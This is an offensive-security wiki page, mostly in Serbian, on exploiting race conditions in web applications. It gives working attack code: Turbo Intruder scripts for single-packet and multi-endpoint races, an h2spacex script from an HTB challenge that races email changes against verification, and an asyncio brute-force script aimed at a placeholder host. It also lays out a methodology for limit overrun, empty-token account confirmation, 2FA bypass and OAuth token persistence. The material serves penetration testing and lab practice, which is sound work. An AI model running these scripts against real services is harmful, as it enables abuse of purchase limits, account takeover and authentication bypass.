# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> For obtaining a deep understanding of this technique check the original report in [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Unapređivanje Race Condition napada

Glavna prepreka za iskorišćavanje race condition je obezbeđivanje da se više zahteva obradi u isto vreme, sa **veoma malom razlikom u vremenu obrade — idealno, manje od 1ms**.

Ovde možete pronaći neke tehnike za sinhronizaciju zahteva:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Podržava slanje dva zahteva preko jedne TCP konekcije, što smanjuje uticaj mrežnog jitter-a. Međutim, zbog varijacija na serverskoj strani, dva zahteva možda neće biti dovoljna za konzistentan exploit race condition-a.
- **HTTP/1.1 'Last-Byte Sync'**: Omogućava predslanje većine delova 20-30 zahteva, zadržavajući mali fragment, koji se zatim pošalje zajedno, postižući simultani dolazak na server.

**Priprema za Last-Byte Sync uključuje:**

1. Slanje header-a i body podataka minus poslednji bajt bez zatvaranja stream-a.
2. Pauza od 100ms nakon inicijalnog slanja.
3. Onemogućavanje TCP_NODELAY da bi se iskoristio Nagle's algorithm za grupisanje finalnih frejmova.
4. Pingovanje da bi se zagrejala konekcija.

Naknadno slanje zadržanih frejmova bi trebalo da rezultuje njihovim dolaskom u jednom paketu, što se može verifikovati pomoću Wireshark. Ova metoda se ne primenjuje na statičke fajlove, koji obično nisu uključeni u RC napade.

### Prilagođavanje arhitekturi servera

Razumevanje arhitekture mete je ključno. Front-end serveri mogu rutirati zahteve drugačije, što utiče na tajming. Preemptivno zagrevanje konekcija na serverskoj strani, putem nebitnih zahteva, može normalizovati vreme obrade zahteva.

#### Rukovanje zaključavanjem na osnovu sesije

Framework-i poput PHP session handler-a serijalizuju zahteve po sesiji, što može zamaskirati ranjivosti. Korišćenjem različitih session tokena za svaki zahtev možete zaobići ovaj problem.

#### Prevazilaženje ograničenja brzine ili resursa

Ako zagrevanje konekcije nije efektivno, ciljano izazivanje kašnjenja na web serverima kroz poplavu dummy zahteva može omogućiti single-packet attack tako što će inducirati serversko kašnjenje pogodno za race condition.

## Primeri napada

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Možete poslati zahtev u **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), u zahtevu možete promeniti vrednost koju želite da brute force-ujete za **`%s`** kao u `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` i zatim izaberite **`examples/race-single-packer-attack.py`** iz padajućeg menija:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Ako planirate da **pošaljete različite vrednosti**, možete izmeniti kod ovim koji koristi wordlist iz clipboard-a:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Ako web ne podržava HTTP2 (samo HTTP1.1), koristite `Engine.THREADED` ili `Engine.BURP` umesto `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: U slučaju da treba da pošaljete request na 1 endpoint, a zatim više na druge endpoints da biste pokrenuli RCE, možete izmeniti skriptu `race-single-packet-attack.py` ovako:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Takođe je dostupno u **Repeater** putem nove opcije '**Send group in parallel**' u Burp Suite.
- Za **limit-overrun** možete jednostavno dodati **isti request 50 puta** u grupu.
- Za **connection warming**, možete **dodati** na **početku** **grupe** neke **requests** ka nekim nestatičnim delovima web servera.
- Za **delaying** procesa **između** obrade **jednog requesta i drugog** u 2 substates koraka, možete **dodati dodatne requests između** oba requesta.
- Za **multi-endpoint** RC možete početi slanjem **requesta** koji **ide u hidden state**, a zatim odmah nakon njega **50 requests** koji **eksploatišu hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Cilj ovog skripta je promeniti email korisnika dok ga kontinuirano verifikuje sve dok verifikacioni token novog emaila ne stigne na poslednji email (ovo zato što je u kodu uočena RC gde je bilo moguće izmeniti email, ali da se verifikacija pošalje na stari jer je varijabla koja ukazuje na email već bila popunjena prvom vrednošću).\
Kada se u primljenim emailovima pronađe reč "objetivo", znamo da smo primili verifikacioni token promenjenog emaila i završavamo napad.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Poboljšanje Single Packet Attack

U originalnom istraživanju objašnjeno je da ovaj napad ima ograničenje od 1,500 bajtova. Međutim, u [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) objašnjeno je kako je moguće proširiti ograničenje od 1,500 bajtova single packet attack-a na **65,535 B window limitation of TCP by using IP layer fragmentation** (podelom jednog paketa na više IP paketa) i slanjem fragmenata u različitom redosledu, što onemogućava ponovno spajanje paketa dok svi fragmenti ne stignu na server. Ova tehnika je istraživaču omogućila da pošalje 10,000 zahteva za oko 166ms.

Imajte na umu da, iako ovo poboljšanje čini napad pouzdanijim u RC situacijama kojima je potrebno da stotine/hiljade paketa stignu istovremeno, može imati i softverska ograničenja. Neki popularni HTTP serveri kao što su Apache, Nginx i Go imaju strogo podešavanje `SETTINGS_MAX_CONCURRENT_STREAMS` na 100, 128 i 250. Međutim, drugi kao NodeJS i nghttp2 imaju to neograničeno.\
Ovo u suštini znači da će Apache uzeti u obzir samo 100 HTTP konekcija iz jedne TCP konekcije (ograničavajući ovaj RC napad).

Možete pronaći neke primere koji koriste ovu tehniku u repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Pre prethodnog istraživanja, korišćeni su neki payloadi koji su samo pokušavali da pošalju pakete što brže kako bi izazvali RC.

- **Repeater:** Proverite primere iz prethodnog odeljka.
- **Intruder**: Pošaljite **request** u **Intruder**, podesite **number of threads** na **30** u **Options menu**, izaberite kao payload **Null payloads** i generišite **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Metodologija**

### Prekoračenje ograničenja / TOCTOU

Ovo je najosnovniji tip race condition-a gde se **vulnerabilities** pojavljuju na mestima koja **ograničavaju broj puta kada možete izvršiti neku akciju**. Na primer, korišćenje istog discount code-a više puta u web prodavnici. Veoma jednostavan primer može se naći u [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ili u [**this bug**](https://hackerone.com/reports/759247)**.**

Postoji mnogo varijacija ovog tipa napada, uključujući:

- Iskorišćavanje gift card-a više puta
- Ocena proizvoda više puta
- Podizanje ili transfer novca koji premašuje stanje na računu
- Ponovno korišćenje jedne CAPTCHA rešenja
- Zaobilaženje anti-brute-force rate limita

### **Skrivena podstanja**

Eksploatisanje kompleksnih race conditions često podrazumeva iskorišćavanje kratkih prilika za interakciju sa skrivenim ili **neplaniranim mašinskim podstanjima**. Evo kako pristupiti tome:

1. **Identify Potential Hidden Substates**
- Počni tako što ćeš identifikovati endpoints koji menjaju ili interaguju sa kritičnim podacima, kao što su user profiles ili password reset procesi. Fokusiraj se na:
- **Storage**: Preferiraj endpoints koji manipulišu server-side persistent podacima u odnosu na one koji rukovode podacima client-side.
- **Action**: Traži operacije koje menjaju postojeće podatke, jer one imaju veću verovatnoću da generišu eksploatabilne uslove u poređenju sa onima koje dodaju nove podatke.
- **Keying**: Uspešni napadi obično uključuju operacije koje su vezane za isti identifikator, npr. username ili reset token.
2. **Conduct Initial Probing**
- Testiraj identifikovane endpoints sa race condition attacks, posmatrajući bilo kakva odstupanja od očekivanih rezultata. Neočekivani odgovori ili promene u ponašanju aplikacije mogu ukazivati na ranjivost.
3. **Demonstrate the Vulnerability**
- Suzi napad na minimalan broj zahteva potrebnih za eksploataciju ranjivosti, često dovoljno dva zahteva. Ovaj korak može zahtevati više pokušaja ili automatizaciju zbog preciznog keširanja vremena.

### Time Sensitive Attacks

Preciznost u vremenu slanja zahteva može otkriti vulnerabilities, posebno kada se za sigurnosne token-e koriste predvidivi metodi kao što su timestamps. Na primer, generisanje password reset tokens bazirano na timestamps može dovesti do identičnih token-a za simultane zahteve.

**To Exploit:**

- Koristi precizno tempiranje, npr. single packet attack, da pošalješ concurrent password reset requests. Identični tokens ukazuju na ranjivost.

**Example:**

- Zatraži dva password reset tokens istovremeno i uporedi ih. Poklapajući tokens sugerišu manu u token generation.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Studije slučaja skrivenih podstanja

### Pay & add an Item

Pogledaj ovaj [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) da vidiš kako da **pay** u prodavnici i **add an extra** item koju **won't need to pay for it**.

### Confirm other emails

Ideja je da se **verify an email address and change it to a different one at the same time** da bi se proverilo da li platforma verifikuje novu adresu koja je promenjena.

### Change email to 2 emails addresses Cookie based

Prema [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab je bio ranjiv na takeover na ovaj način jer bi mogao **send** the **email verification token of one email to the other email**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

Ako se koriste **2 different writes** za **add** **information** unutar **database**, postoji mali vremenski period u kome je **only the first data has been written** u bazi. Na primer, pri kreiranju user-a, **username** i **password** mogu biti **written**, a zatim se **then the token** za potvrdu novokreiranog naloga upiše. To znači da u kratkom vremenu **token to confirm an account is null**.

Stoga **registracija naloga i slanje nekoliko zahteva sa praznim token-om** (`token=` or `token[]=` or any other variation) da se odmah potvrdi nalog, moglo bi omogućiti d**a potvrdite nalog** na kome ne kontrolišete email.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

Sledeći pseudo-code je ranjiv na race condition jer u veoma kratkom vremenu **2FA is not enforced** dok se session kreira:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 večna perzistencija

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Ove usluge vam omogućavaju da napravite aplikaciju i autentifikujete korisnike koje je provajder registrovao. Da bi to uradio, **client** će morati da **dozvoli vašoj aplikaciji** pristup nekim od njihovih podataka unutar **OAUth provider**.  
Dakle, do sada je to samo uobičajeni login sa google/linkedin/github... gde vam se prikaže stranica na kojoj piše: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

The **problem** appears when you **accept it** and automatically sends an **`authorization_code`** to the malicious application. Zatim ta **aplikacija zloupotrebljava Race Condition u OAUth service provideru da generiše više od jednog AT/RT** (_Authentication Token/Refresh Token_) iz **`authorization_code`** za vaš nalog. U suštini, zloupotrebljava činjenicu da ste prihvatili da aplikacija pristupi vašim podacima da **kreira više naloga**. Ako potom **prestanete da dozvoljavate aplikaciji pristup vašim podacima, jedan par AT/RT će biti izbrisan, ali ostali će i dalje biti validni**.

#### Race Condition in `Refresh Token`

Once you have **obtained a valid RT** you could try to **abuse it to generate several AT/RT** and **even if the user cancels the permissions** for the malicious application to access his data, **several RTs will still be valid.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) možete naći PoC u Java koji šalje websocket poruke **paralelno** da bi zloupotrebio **Race Conditions i u Web Sockets**.
- With Burp’s WebSocket Turbo Intruder možete koristiti **THREADED** engine da pokrenete više WS konekcija i ispaljujete payloads paralelno. Počnite od zvaničnog primera i podešavajte `config()` (broj thread-ova) za konkurentnost; ovo je često pouzdanije od batch-ovanja na jednoj konekciji kada se race-uje server‑side stanje kroz WS handlere. Pogledajte [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
